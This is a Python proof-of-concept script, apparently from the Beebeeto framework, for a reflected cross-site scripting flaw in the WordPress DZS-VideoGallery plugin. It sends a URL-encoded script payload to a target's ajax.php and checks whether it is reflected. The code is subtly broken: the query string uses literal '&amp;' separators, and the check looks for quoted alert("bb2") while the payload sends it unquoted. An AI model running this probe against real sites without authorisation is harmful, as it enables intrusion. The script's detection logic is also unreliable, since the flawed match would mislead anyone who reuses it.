#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0195',
            'name': 'WordPress DZS-VideoGallery /ajax.php XSS漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress DZS-VideoGallery',
            'vul_version': [''],
            'type': 'Cross Site Scripting',
            'tag': ['WordPress DZS-VideoGallerye', 'xss漏洞', '/wp-content/plugins/dzs-videogallery/ajax.php', 'php'],
            'desc': '''
                    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。
                    DZS-VideoGallery是其中的一个DZS视频库插件。 
                    WordPress DZS-VideoGallery插件中存在跨站脚本漏洞，该漏洞源于程序没有正确过滤用户提交的输入。
                    当用户浏览被影响的网站时，其浏览器将执行攻击者提供的任意脚本代码，这可能导致攻击者窃取基于cookie的身份认证并发起其它攻击。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-61532',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = ("/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&amp;height=400&amp;"
                   "width=610&amp;type=vimeo&amp;source=%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert("bb2")</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args
        
    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())